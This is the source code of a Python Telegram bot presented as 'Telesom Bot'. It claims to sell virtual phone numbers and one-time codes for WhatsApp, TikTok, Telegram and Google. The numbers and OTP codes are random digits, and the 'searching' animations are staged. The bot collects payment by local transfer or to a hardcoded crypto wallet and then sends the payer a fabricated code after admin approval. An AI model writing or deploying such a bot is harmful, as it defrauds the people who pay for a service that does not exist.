import os, random, asyncio
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== STORAGE =====
user_data = {}
pending_admin = {}

# ===== STATES =====
class UserState(StatesGroup):
    waiting_name = State()
    waiting_age = State()
    waiting_photo = State()
    waiting_code_check = State()
    waiting_payment_screenshot = State()

# ===== HELPERS =====
def random_number(local=False, vip=False):
    if vip:
        # VIP number pattern 063 + random repeated digits
        return "63" + "".join(str(random.randint(0,9)) for _ in range(7))
    return "63" + "".join(str(random.randint(0,9)) for _ in range(7))

def service_code(service):
    codes = {
        "whatsapp": lambda: "".join(random.choices("0123456789", k=6)),
        "tiktok": lambda: "TT" + "".join(random.choices("0123456789", k=5)),
        "telegram": lambda: "TG" + "".join(random.choices("0123456789", k=5)),
        "google": lambda: "G-" + "".join(random.choices("0123456789", k=8)),
        "card": lambda: "".join(random.choices("0123456789", k=6))
    }
    return codes.get(service, lambda: "".join(random.choices("0123456789", k=6)))()

async def animation(msg, text, sec=5):
    for i in range(sec):
        dots = "." * ((i%3)+1)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")


# ===== START =====
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"), KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot ✅\nDooro New Order ama Check Code", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(lambda message: message.text == "New Order")
async def new_order(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro nooca order-ka:", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton("TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton("TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton("GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp","tiktok","telegram","google"]))
async def service_selected(call: types.CallbackQuery):
    service = call.data
    number = random_number()
    user_data[call.from_user.id] = {"service":service, "number":number}
    msg = await call.message.edit_text(f"Number Searching")
    await animation(msg,"Number Searching",5)
    # Number found
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="local")],
        [InlineKeyboardButton("CRYPTO", callback_data="crypto")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await msg.edit_text(f"Number: +252{number}\nDir Lacagta si aad u hesho OTP.", reply_markup=kb)

# ===== CANCEL =====
@dp.callback_query(F.data=="cancel")
async def cancel(call: types.CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")


# ===== LOCAL PAYMENT =====
@dp.callback_query(F.data=="local")
async def local_payment(call: types.CallbackQuery):
    number = user_data[call.from_user.id]["number"]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM PAYMENT", callback_data="confirm_payment")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(
        f"Fadlan soo dir lacagta \nNumber: +252{number}\nKadib riix CONFIRM",
        reply_markup=kb
    )

@dp.callback_query(F.data=="confirm_payment")
async def confirm_payment(call: types.CallbackQuery):
    await call.message.edit_text("Payment confirmed, admin-ga wargelinaya...")
    # Admin notification
    user = user_data[call.from_user.id]
    code = service_code(user["service"])
    user_data[call.from_user.id]["code"] = code
    pending_admin[call.from_user.id] = True
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"admin_ok_{call.from_user.id}")]
    ])
    await bot.send_message(ADMIN_ID,f"User {call.from_user.id} paid LOCAL for {user['service']}.\nNumber: +252{user['number']}\nCode: {code}", reply_markup=kb)
    # Show OTP countdown animation to user
    msg = await call.message.edit_text("OTP Searching")
    await animation(msg,"OTP Searching",5)
    if pending_admin.get(call.from_user.id):
        await call.message.answer("PLEASE SEND MONEY 💵")

# ===== CRYPTO PAYMENT =====
@dp.callback_query(F.data=="crypto")
async def crypto_payment(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("BNB:0x98ffcb29a4fc182d461ebdba54648d8fe24597ac", callback_data="copy_bnb")],
        [InlineKeyboardButton("USDT-BEP20:0x98ffcb29a4fc182d461ebdba54648d8fe24597ac", callback_data="copy_usdt")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text("Dooro payment address:", reply_markup=kb)

@dp.callback_query(F.data.in_(["copy_bnb","copy_usdt"]))
async def copy_address(call: types.CallbackQuery):
    addr = {
        "copy_bnb": "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac",
        "copy_usdt": "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    }[call.data]
    await call.answer(f"Address copied: {addr}", show_alert=True)

# ===== ADMIN APPROVE =====
@dp.callback_query(F.data.startswith("admin_ok_"))
async def admin_approve(call: types.CallbackQuery):
    uid=int(call.data.split("_")[-1])
    if uid in user_data:
        pending_admin[uid]=False
        await bot.send_message(uid,f"Payment Confirmed ✅\nOTP Code: {user_data[uid]['code']}")
        await call.message.edit_text("Approved ✅")

# ===== RUN =====
async def main():
    await dp.start_polling(bot)

if __name__=="__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
